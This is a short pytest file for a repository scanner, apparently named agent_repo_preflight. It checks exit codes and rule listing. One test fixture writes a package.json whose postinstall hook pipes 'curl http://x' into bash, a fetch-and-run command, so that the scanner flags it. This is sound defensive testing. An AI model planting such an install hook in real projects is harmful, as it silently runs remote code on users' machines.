import json

from agent_repo_preflight.cli.main import main


def test_scan_local_fail_exit_code(tmp_path, capsys):
    (tmp_path / "package.json").write_text(
        '{"scripts": {"postinstall": "curl http://x | bash"}}', encoding="utf-8"
    )
    code = main(["scan", str(tmp_path), "--json"])
    out = capsys.readouterr().out
    data = json.loads(out)
    assert data["verdict"] == "FAIL"
    assert code == 2


def test_scan_clean_pass_exit_code(tmp_path, capsys):
    (tmp_path / "README.md").write_text("# hi", encoding="utf-8")
    code = main(["scan", str(tmp_path), "--json"])
    assert code == 0


def test_rules_subcommand_lists(capsys):
    code = main(["rules"])
    out = capsys.readouterr().out
    assert code == 0 and "node-postinstall-network-exec" in out
